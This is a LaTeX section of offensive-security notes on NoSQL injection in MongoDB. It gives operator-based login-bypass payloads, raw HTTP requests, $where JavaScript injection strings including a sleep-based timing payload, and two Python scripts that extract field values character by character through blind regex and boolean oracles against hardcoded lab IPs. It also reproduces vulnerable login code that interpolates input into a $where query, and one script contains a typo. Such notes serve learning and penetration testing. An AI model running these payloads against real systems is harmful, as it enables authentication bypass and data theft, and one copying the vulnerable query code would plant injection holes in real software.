
\section{MongoDB}

\url{https://zanon.io/posts/nosql-injection-in-mongodb/}
\url{https://www.dailysecurity.fr/nosql-injections-classique-blind/}

The MongoDB API expects BSON (Binary JSON) calls, and includes a secure BSON
query assembly tool. However, according to MongoDB documentation - unserialized
JSON and JavaScript expressions are permitted in several alternative query
parameters.  The most commonly used API call allowing arbitrary JavaScript
input is the \verb+$where+ operator.

\url{https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf}

\subsection{Login bypass}
\subsubsection{Vulnerable code}
\begin{verbatim}
// NodeJS with Express.js
db.collection('users').find({
"user": req.query.user,
"password": req.query.password
});

// PHP
$collection->find(array(
'user' => $_GET['user'],
'password' => $_GET['password']
));
# Ruby on Rails
db['users'].find({
:user => req.params['user'],
:password => req.params['password']
})
# Python with Django
db.users.find({
"user": request.GET['user'],
"password": request.GET['password']
})
\end{verbatim}


\subsubsection{Comparaison operator based Request}

When passing URL-encoded parameters to PHP, \verb+param[$op]=val+ is the same
as \verb+param: {$op: val}+ 

\verb+https://example.org/login?user=patrick&password[$ne]=+
or

\begin{verbatim}
POST /login HTTP/1.1
Host: example.org
Content-Type: application/json
Content-Length: 38
{'user': {'&gt': ''}, 'password': {'&gt': ''}}


POST /login HTTP/1.1
Host: example.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
user[$ne]=toto&password[$ne]=toto
\end{verbatim}

\subsubsection{\$regex Request}
\begin{verbatim}

POST /login HTTP/1.1
Host: example.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
user[$regex]=.*&password[$regex]=.*

\end{verbatim}




\subsection{Inband}

Payload examples:
\begin{verbatim}
param[$ne]=toto
param[$gt]=
param[$lt]=~

\end{verbatim}



\subsection{Blind}

\begin{verbatim}
import requests
import json
import string

alphabet = string.ascii_lowercase + string.ascii_uppercase
alphabet += string.digits + "_@{}-/()!\"%=^[]:;"


param_name = 'trackingNum'
false_value = 'DoesNotExist'
init_value = 'HTB'
success_str = 'bmdyy'
schema = 'http://'
fqdn = '144.126.236.139'
port = ':31774'
path = '/index.php'
url = f'{schema}{fqdn}{port}{path}'


def oracle_get(t):
    r = requests.get(f"{url}?{param_name}[$regex]=^{t}.*")
    return success_str in r.text

def oracle_post(t):
    r = requests.post(
        url,
        headers = {"Content-Type": "application/json"},
        data = json.dumps({f"{param_name}": t})
    )
    return success_str in r.text

print(url)
assert (oracle_post(false_value) == False)
assert (oracle_post({"$regex": f"^{init_value}.*"}) == True)

current_value = init_value
finished = False
while not finished: 
    finished = True
    for c in alphabet: 
        if oracle_post({"$regex": "^" + current_value + c}): 
            current_value += c
            finished = False
            print(f'[+] current value: {current_value}')
            break 


assert (oracle_post(current_value) == True)

print("param: " + current_value)
\end{verbatim}


\subsection{Server-Side JS injection}

when the server side code is using \verb+$where+ to perform the request.

\begin{verbatim}
$cursor = $collection->find(array('$where' => $query));
\end{verbatim}

you may need to try appending certain characters to correctly terminate the query:
\begin{itemize}
    \item \verb+//+
    \item \verb+%00+
    \item \verb+'+
    \item \verb+"+
    \item 
    some number of closing brackets or braces, in some combination
\end{itemize}

\begin{verbatim}
username="; (this.username.length == 5 ) || sleep(600)%00&password=a
\end{verbatim}


\subsubsection{Bypass Auth}


Exemple of vulnerable code found in a login form.
\begin{verbatim}
    const username = req.body.username;
    const password = req.body.password;
    if (username === undefined || password === undefined) {
        res.status(400).send('Bad Request');
        return;
    }
    const passToTest = require('crypto').createHash('md5').update(password).digest('hex');
    const query = { $where: `this.username === '${username}' && this.password === '${passToTest}'` };
    const result = await User.find(query).maxTimeMS(350);
    if (result.length === 0) {
        res.redirect('/login?error=WrongCredentials');
    } else {
        req.session.username = req.body.username;
        req.session.save((error) => {
            if (error) {
                res.redirect('/login?error=WrongCredentials');
            } else {
                res.redirect('/admin');
            }
        });
    }
});
\end{verbatim}

this can be therefore bypassed with password value set to \verb+toto' || ' 1==1+

or \verb+username+ \verb+' || true || ''=='+



\subsubsection{Boolean based injection}

\verb+" || (this.<FIELD>.match('^.*')) || ""=="+ should return a true value

\verb+" || (this.username.match('^DoesNotExist.*')) || ""=="+ should return the false value



\begin{verbatim}
import requests
import json
import string
from urllib.parse import quote_plus

alphabet = string.ascii_lowercase + string.ascii_uppercase
alphabet += string.digits + "_@{}-/()!\"%=^[]:;"
alphabet = sting.printable

param_prefix=''
param_suffix='&password=x'
param_name = 'username'
init_value = 'H'
success_str = 'Logged in as'
schema = 'http://'
fqdn = '139.59.174.176'
port = ':30546'
path = '/index.php'
url = f'{schema}{fqdn}{port}{path}'

def oracle_post(t):
    t = quote_plus('" || (' + t + ') || ""=="') 
    inject = f'{param_name}={t}'
    d = f"{param_prefix}{inject}{param_suffix}"
    r = requests.post(
        url,
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data = d
    )
    #print(r.text)
    return success_str in r.text


assert (oracle_post('true') == True)
assert (oracle_post('false') == False)

current_value = init_value
finished = False
position = len(init_value)
payload_p = f'this.{param_name}.startsWith("{init_value}")'
while not finished: 
    finished = True
    for c in alphabet:
        payload_s = f'this.{param_name}.charCodeAt({position}) == {ord(c)}'
        if oracle_post(f'{payload_p} && {payload_s}'): 
            current_value += c
            position += 1
            finished = False
            print(f'[+] current value: {current_value}')
            break 


assert (oracle_post(current_value) == True)

print("param: " + current_value)


\end{verbatim}

\subsubsection{Time based injection}

Sometimes, even when injection is possible and the attacker has sent valid true
and false values, the page response is identical, and it can't be determined if
an injection was successful or not.

In these cases, we can still try to determine if an injection takes place by
asking the NoSQL instance to pause for a period of time before returning
results, and detecting the resulting difference in time as the proof of
successful injection. Timing injection is identical to blind boolean injection,
except instead of trying to get the page to return true or false values, we try
to get the page the load more slowly (for true) or quickly (for false).

{\bf Timing injections are only possible where JS can be executed in the
database}

same code as before but :
\begin{verbatim}
username="; (this.username.length == 5 ) || sleep(600)%00&password=a
\end{verbatim}
